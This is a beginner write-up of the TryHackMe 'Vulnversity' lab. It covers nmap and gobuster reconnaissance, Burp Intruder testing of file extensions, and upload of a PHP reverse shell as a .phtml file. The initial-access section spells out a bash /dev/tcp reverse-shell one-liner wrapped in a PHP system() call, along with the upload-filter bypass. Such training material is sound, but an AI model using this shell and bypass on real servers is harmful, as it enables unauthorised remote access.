# Vulnversity Write-Up

![]()

Vulnversity is a Easy machine on tryhackme. This is a beginner level box to learn about recon, web app attacks and basic privilege escalation
---

## Deploy Machine

You may follow along this write up here on [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

### Connect via OpenVPN

If you are not subscribed yet on tryhackme, you may access all of the free rooms. If so, you need to connect your kali or any other pentesting distro to tryhackme network.

Connect to openvpn in order to recon and attack the machine.

if you are using the latest kali 2020.2:

```
sudo openvpn --config /path/to/openvpn_file.ovpn
```

![]()

To verify your connection, you may ping the ip_address of the machine indicated on your session.

To know your private address on the openvpn configuration, just type on the terminal:
```
ifconfig tun0
```

---

## Reconnaissance, Enumeration and Initial Access

In manual penetration testing, the first phase is to enumerate open ports. We can use the [nmap](https://nmap.org) tool to scan for open ports.

Create a directory to store the nmap file
```
mkdir nmap
nmap -sV -sC -oA nmap/vulnversity -v <ip_address>
```

Even the scanning is not done, we can see all of the open ports on the machine if we specify the -v flag on nmap.

![]()

To learn what services running, we can wait until the scanning is finished.

![]()

As we can see here, the Apache (Web server) is running on port 3333. View more details on the [nmap directory]()

Open the ip address of the machine in a browser: http://ip_address:3333

![]()

Since we discovered that the machine is running a web server, we might need to check for hidden directories. On this challenge on tryhackme we are being introduced to some tools to locate hidden directories. But lets try the very basic first. 

http://ip_address:3333/robots.txt

![]()

We can't find any hidden directories. Our goal here is to find any web pages where we can upload our reverse shell to gain initial access to the server. There's a lot of tools available. But on this write-up I'll use gobuster.

If you are using kali 2020.2 you just need to run
```
sudo apt install gobuster -y
```

to install gobuster.

If you are using other pentesting distro, or lower versions of kali we might need to build it from scratch.

To install go lang, go to: [https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz](https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz)

or simply run:
```
curl -fsSo go1.14.6.linux-amd64.tar.gz https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz
```

Install go:
```
sudo tar -C /usr/local -xzf go1.14.6.linux-amd64.tar.gz
```
Now we need to put the path so we can call the "go" command on terminal without going to the absolute path and run the source:
```
echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.bashrc
source .bashrc
```

You may check [golang documentation](https://golang.org/doc/install) for more details here.

Now we installed go lang, we do not need to build it from source. Just download the dependencies (Much easier right?)
```
cd /opt
sudo git clone https://github.com/OJ/gobuster
cd gobuster
sudo go get && sudo go build 
```

If you want to put it in path, just export it:
```
echo "export PATH=$PATH:/usr/local/go/bin:/opt/gobuster/gobuster"
```

To verify your installation make sure that you will see the helpscreen:
```
gobuster --help
```

Now use gobuster to bruteforce hidden directories on the server:
```
gobuster dir -u http://10.10.228.255:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![]()

We see that, all of the directories shown on the result. Now we can start check those directories. We will find that we can upload a file on https://ip_address:3333/internal/

![]()

We now need to check what is the extension type to upload so we can bypass the check. Webshells are present in /usr/share/web on kali. or if not you may use the php web shell on the link provided by tryhackme. 

Or why not create one?

```
echo "bash -i >& /dev/tcp/ip_address/port 0>&1" | base64 | xclip
echo '<?php echo system("echo sub | base64 -d | bash"); ?>' | sed s/sub/$(xclip -o)/g revshell.php
```

So now we have created a php reverse shell try and upload it on the server. We encode it to base64 since /bin/sh is not running on php, you'll have a problem on fds if you're not going to encode it.

![]()

The extension is not allowed. This is a common filtering to ensure that no other files can be uploaded on the server. But let us use BurpSuite to check what file extenstion can be uploaded on the server.

Following task 4 on Vulnversity, we will customized our attack by creating a simple dictionary for file extensions on burpsuite.

To setup burp, we just need to download foxy proxy as the extension and add a new proxy:

![]()

Once the proxy is setup, go back to http://ip_address:3333/internal/ and upload the anyfile without a .php extension. Don't submit yet since we need to ensure that we can intercept the browser traffic by capturing all traffic from foxyproxy to burpsuite.

![]()

After capturing and hitting submit, it will be redirected to burpsuite. Click on proxy > Action > Send to Intruder. After sending it to intruder, go to Positions tab > modify the extension to be blank. it should be:
```
anyfile.§§
```

![]()

Now go to Payloads tab and add these payloads and start attack:
```
php
php3
php4
php5
phtml
```

![]()

You will notice that phtml file has a different length than others. Also on the response tab we will see that it successfully uploaded the file.

![]()


Now we just need to rename our revshell.php to revshell.phtml and upload the file. create a listener and go to uploads directory on the web.
```
http://ip_address:3333/internal/uploads/revshell.phtml
```




